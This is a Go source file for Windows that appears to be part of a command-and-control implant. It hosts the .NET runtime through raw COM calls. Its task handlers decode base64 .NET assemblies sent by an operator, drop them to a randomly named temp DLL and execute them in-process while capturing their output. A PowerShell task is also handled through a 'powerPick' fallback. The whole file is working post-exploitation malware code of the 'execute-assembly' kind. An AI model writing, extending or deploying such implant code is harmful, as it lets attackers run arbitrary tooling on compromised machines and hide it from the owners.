//go:build windows

package main

import (
	"encoding/base64"
	"fmt"
	"math/rand"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"unsafe"
)

var (
	clrMod        = syscall.NewLazyDLL("mscoree.dll")
	procCLRCreate = clrMod.NewProc("CLRCreateInstance")

	procGetStdHandle = k32.NewProc("GetStdHandle")
	procSetStdHandle = k32.NewProc("SetStdHandle")
)

var (
	clsCLRMetaHost     = guid{0x9280188D, 0x0E8E, 0x4867, [8]byte{0xB3, 0x0C, 0x7F, 0xA8, 0x38, 0x84, 0xE8, 0xDE}}
	iidICLRMetaHost    = guid{0xD332DB9E, 0xB9B3, 0x4125, [8]byte{0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16}}
	iidICLRRuntimeInfo = guid{0xBD39D1D2, 0xBA2F, 0x486A, [8]byte{0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91}}
	clsCLRRuntimeHost  = guid{0x90F1A06E, 0x7712, 0x4762, [8]byte{0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02}}
	iidICLRRuntimeHost = guid{0x90F1A06C, 0x7712, 0x4762, [8]byte{0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02}}
)

const (
	stdOutputHandle = ^uint32(10) + 1

	clrStartVtableIdx         = 3
	clrExecInDefaultVtableIdx = 7
	clrMetaHostGetRuntimeIdx  = 3
	clrRuntimeInfoGetIFaceIdx = 9
)

var (
	clrHostInitialized bool
	clrInitOnce        sync.Once
	clrHostMu          sync.Mutex
)

func initCLRHosting() bool {
	if runtime.GOOS != "windows" {
		return false
	}
	clrInitOnce.Do(func() {
		_, err := createCLRHost("v4.0.30319")
		if err != nil {
			if Debug {
				fmt.Printf("[clr] CLR hosting initialization failed: %v\n", err)
			}
			clrHostInitialized = false
		} else {
			clrHostInitialized = true
			if Debug {
				fmt.Println("[clr] CLR hosting initialized successfully")
			}
		}
	})
	return clrHostInitialized
}

var cachedHost uintptr

func getOrCreateCLRHost() (uintptr, error) {
	clrHostMu.Lock()
	defer clrHostMu.Unlock()

	if cachedHost != 0 {
		return cachedHost, nil
	}

	host, err := createCLRHost("v4.0.30319")
	if err != nil {
		return 0, err
	}

	cachedHost = host
	return cachedHost, nil
}

func createCLRHost(version string) (uintptr, error) {
	var pMetaHost uintptr
	ret, _, _ := procCLRCreate.Call(
		uintptr(unsafe.Pointer(&clsCLRMetaHost)),
		uintptr(unsafe.Pointer(&iidICLRMetaHost)),
		uintptr(unsafe.Pointer(&pMetaHost)),
	)
	if ret != 0 {
		return 0, fmt.Errorf("CLRCreateInstance: HRESULT 0x%08X", uint32(ret))
	}
	if pMetaHost == 0 {
		return 0, fmt.Errorf("CLRCreateInstance: null pointer")
	}

	verPtr, err := syscall.UTF16PtrFromString(version)
	if err != nil {
		releaseCOMPtr(pMetaHost)
		return 0, fmt.Errorf("UTF16: %w", err)
	}

	var pRuntimeInfo uintptr
	ret = vtableCall(pMetaHost, clrMetaHostGetRuntimeIdx,
		uintptr(unsafe.Pointer(verPtr)),
		uintptr(unsafe.Pointer(&iidICLRRuntimeInfo)),
		uintptr(unsafe.Pointer(&pRuntimeInfo)))
	releaseCOMPtr(pMetaHost)
	if ret != 0 {
		return 0, fmt.Errorf("GetRuntime: HRESULT 0x%08X", uint32(ret))
	}
	if pRuntimeInfo == 0 {
		return 0, fmt.Errorf("GetRuntime: null pointer")
	}

	var pRuntimeHost uintptr
	ret = vtableCall(pRuntimeInfo, clrRuntimeInfoGetIFaceIdx,
		uintptr(unsafe.Pointer(&clsCLRRuntimeHost)),
		uintptr(unsafe.Pointer(&iidICLRRuntimeHost)),
		uintptr(unsafe.Pointer(&pRuntimeHost)))
	releaseCOMPtr(pRuntimeInfo)
	if ret != 0 {
		return 0, fmt.Errorf("GetInterface: HRESULT 0x%08X", uint32(ret))
	}
	if pRuntimeHost == 0 {
		return 0, fmt.Errorf("GetInterface: null pointer")
	}

	ret = vtableCall(pRuntimeHost, clrStartVtableIdx)
	if ret != 0 {
		releaseCOMPtr(pRuntimeHost)
		return 0, fmt.Errorf("Start: HRESULT 0x%08X", uint32(ret))
	}

	return pRuntimeHost, nil
}

func vtableCall(ptr uintptr, index int, args ...uintptr) uintptr {
	if ptr == 0 {
		return 0x80004004
	}
	// Dereference COM object's vtable pointer (first 8 bytes of any COM object)
	vtable := *(*uintptr)(unsafe.Pointer(ptr))
	// Index into vtable to get function pointer at the given index (each entry = 8 bytes on x64)
	fn := *(*uintptr)(unsafe.Pointer(vtable + uintptr(index)*8))

	n := uintptr(len(args))
	switch n {
	case 0:
		ret, _, _ := syscall.Syscall(fn, 1, ptr, 0, 0)
		return ret
	case 1:
		ret, _, _ := syscall.Syscall(fn, 2, ptr, args[0], 0)
		return ret
	case 2:
		ret, _, _ := syscall.Syscall(fn, 3, ptr, args[0], args[1])
		return ret
	case 3:
		ret, _, _ := syscall.Syscall6(fn, 4, ptr, args[0], args[1], args[2], 0, 0)
		return ret
	case 4:
		ret, _, _ := syscall.Syscall6(fn, 5, ptr, args[0], args[1], args[2], args[3], 0)
		return ret
	case 5:
		ret, _, _ := syscall.Syscall6(fn, 6, ptr, args[0], args[1], args[2], args[3], args[4])
		return ret
	case 6:
		ret, _, _ := syscall.Syscall9(fn, 7, ptr, args[0], args[1], args[2], args[3], args[4], args[5], 0, 0)
		return ret
	default:
		return 0x80070057
	}
}

func releaseCOMPtr(ptr uintptr) {
	if ptr == 0 {
		return
	}
	// IUnknown::Release is always at vtable index 2 (offset 2*8 = 16 on x64)
	vtable := *(*uintptr)(unsafe.Pointer(ptr))
	releaseFn := *(*uintptr)(unsafe.Pointer(vtable + 2*8))
	syscall.Syscall(releaseFn, 1, ptr, 0, 0)
}

func executeAssemblyInProcess(assemblyData []byte, args string) (string, error) {
	if !clrHostInitialized {
		return "", fmt.Errorf("CLR hosting not initialized")
	}
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("execute-assembly is Windows-only")
	}

	tmpFile := filepath.Join(os.TempDir(), fmt.Sprintf("fa%x.dll", rand.Uint64()))
	if err := os.WriteFile(tmpFile, assemblyData, 0600); err != nil {
		return "", fmt.Errorf("write temp assembly: %w", err)
	}
	defer os.Remove(tmpFile)

	host, err := getOrCreateCLRHost()
	if err != nil {
		return "", fmt.Errorf("CLR host: %w", err)
	}

	return executeAssemblyWithStdoutCapture(host, tmpFile, args)
}

func executeAssemblyWithStdoutCapture(host uintptr, assemblyPath, args string) (string, error) {
	assemblyPathPtr, err := syscall.UTF16PtrFromString(assemblyPath)
	if err != nil {
		return "", fmt.Errorf("UTF16: %w", err)
	}

	typeName := "Program"
	methodName := "Main"
	argsStr := args
	if args != "" {
		parts := strings.SplitN(args, " ", 2)
		if len(strings.Split(parts[0], ".")) >= 2 {
			dotIdx := strings.LastIndex(parts[0], ".")
			if dotIdx > 0 {
				typeName = parts[0][:dotIdx]
				methodName = parts[0][dotIdx+1:]
				if len(parts) > 1 {
					argsStr = parts[1]
				} else {
					argsStr = ""
				}
			}
		}
	}
	argsPtr, _ := syscall.UTF16PtrFromString(argsStr)

	origStdout, _, _ := procGetStdHandle.Call(uintptr(stdOutputHandle))

	var hRead, hWrite uintptr
	sa := &struct {
		nLength              uint32
		lpSecurityDescriptor uintptr
		bInheritHandle       uint32
	}{
		nLength: uint32(unsafe.Sizeof(struct {
			nLength              uint32
			lpSecurityDescriptor uintptr
			bInheritHandle       uint32
		}{})),
		bInheritHandle: 1,
	}

	ret, _, _ := procCreatePipe.Call(
		uintptr(unsafe.Pointer(&hRead)),
		uintptr(unsafe.Pointer(&hWrite)),
		uintptr(unsafe.Pointer(sa)),
		0,
	)
	if ret == 0 {
		return "", fmt.Errorf("CreatePipe for stdout capture failed")
	}

	procSetStdHandle.Call(uintptr(stdOutputHandle), hWrite)

	var execErr error
	var stdoutOutput string
	executed := false

	typeCandidates := []string{typeName, "Runner", "Class1"}
	methodCandidates := []string{methodName, "Main", "Run"}

	dedup := make(map[string]bool)

	for _, tn := range typeCandidates {
		for _, mn := range methodCandidates {
			key := tn + "." + mn
			if dedup[key] {
				continue
			}
			dedup[key] = true

			var retVal uint32
			tnPtr, _ := syscall.UTF16PtrFromString(tn)
			mnPtr, _ := syscall.UTF16PtrFromString(mn)

		// Resolve ICLRRuntimeHost::ExecuteInDefaultAppDomain from vtable
		vtable := *(*uintptr)(unsafe.Pointer(host))
		fn := *(*uintptr)(unsafe.Pointer(vtable + uintptr(clrExecInDefaultVtableIdx)*8))

			hr, _, _ := syscall.Syscall6(fn, 6,
				host,
				uintptr(unsafe.Pointer(assemblyPathPtr)),
				uintptr(unsafe.Pointer(tnPtr)),
				uintptr(unsafe.Pointer(mnPtr)),
				uintptr(unsafe.Pointer(argsPtr)),
				uintptr(unsafe.Pointer(&retVal)),
			)

			if hr == 0 {
				executed = true
				if retVal != 0 {
					stdoutOutput += fmt.Sprintf("(exit code: %d)", retVal)
				}
				break
			}
			execErr = fmt.Errorf("ExecuteInDefaultAppDomain(%s): HRESULT 0x%08X", key, uint32(hr))
		}
		if executed {
			break
		}
	}

	procSetStdHandle.Call(uintptr(stdOutputHandle), origStdout)
	procCloseHandle.Call(hWrite)

	var outBuf [8192]byte
	var captured strings.Builder
	for {
		var nread uint32
		ret, _, _ := procReadFile.Call(
			hRead,
			uintptr(unsafe.Pointer(&outBuf[0])),
			uintptr(len(outBuf)),
			uintptr(unsafe.Pointer(&nread)),
			0,
		)
		if ret == 0 || nread == 0 {
			break
		}
		captured.Write(outBuf[:nread])
	}
	procCloseHandle.Call(hRead)

	stdoutStr := strings.TrimSpace(captured.String())
	if stdoutStr != "" {
		if stdoutOutput != "" {
			stdoutOutput = stdoutStr + "\n" + stdoutOutput
		} else {
			stdoutOutput = stdoutStr
		}
	}

	if !executed && execErr != nil {
		return stdoutOutput, execErr
	}

	return stdoutOutput, nil
}

func runPowerShellInProcess(script string) (string, error) {
	if !clrHostInitialized {
		return powerPick(script), nil
	}
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("in-process PowerShell is Windows-only")
	}
	if script == "" {
		return "", fmt.Errorf("script is required")
	}

	if Debug {
		fmt.Println("[clr] In-process PowerShell not yet implemented, falling back to powerPick")
	}
	return powerPick(script), nil
}

func handleCLRExecAssembly(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "clr_exec_assembly is Windows-only"
		return
	}

	data, err := base64.StdEncoding.DecodeString(task.Data)
	if err != nil {
		res.Error = fmt.Sprintf("base64 decode failed: %v", err)
		return
	}

	out, err := executeAssemblyInProcess(data, task.Command)
	if err != nil {
		res.Error = err.Error()
	}
	if out != "" {
		res.Output = out
	}
}

func handleCLRPowerShell(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "clr_powershell is Windows-only"
		return
	}

	out, err := runPowerShellInProcess(task.Command)
	if err != nil {
		res.Error = err.Error()
	}
	if out != "" {
		res.Output = out
	}
}
